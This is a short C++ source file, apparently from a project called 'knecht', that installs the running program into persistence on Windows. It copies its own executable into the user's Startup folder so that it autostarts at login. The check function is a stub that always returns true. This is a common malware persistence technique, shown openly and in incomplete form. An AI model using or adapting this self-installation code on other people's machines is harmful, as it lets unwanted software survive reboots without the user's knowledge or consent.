/**
 * @brief Checks if the program is persistent and if not installs itself to the system.
 * @file persistance.cpp
 * @author Sebastian Hasch
 * @date 27.11.2023
 */

#include <iostream>
#include <fstream>
#include <stdexcept>

#include "../../include/persistance/persistance.hpp"
#include "../../include/errorMessages.hpp"

persistance::persistance(char const* argv[]) {
    wchar_t* localAppData = 0;
    SHGetKnownFolderPath(FOLDERID_Programs, 0, NULL, &localAppData);
    std::wstring fullPath(localAppData);
    fullPath += std::wstring(L"\\Startup\\knecht.exe");
    this->fullPath = fullPath;
    CoTaskMemFree(static_cast<void*>(localAppData));
}
persistance::~persistance() {
    this->fullPath.clear();
}

 /**
  * @brief   Checks for persistance and if not, installs itself to the system.
  * @return  Boolean indicating persistance status.
  *          True - Persistance with autostart, False - No Persistance
  */
bool persistance::persist(char const* argv[]) {
    if(checkPersist(argv) == false) 
        return makePersistent(argv);
    else
        return true;
}

bool persistance::checkPersist(char const* argv[]) {
    // TODO: Check if file exists at this->fullPath and compare hashes with argv[0]
    return true;
}
bool persistance::makePersistent(char const* argv[]) {
    std::ifstream src(argv[0], std::ios::binary);
    std::ofstream dst(this->fullPath, std::ios::binary);
    dst << src.rdbuf();
    dst.close();
    src.close();


    return true;
}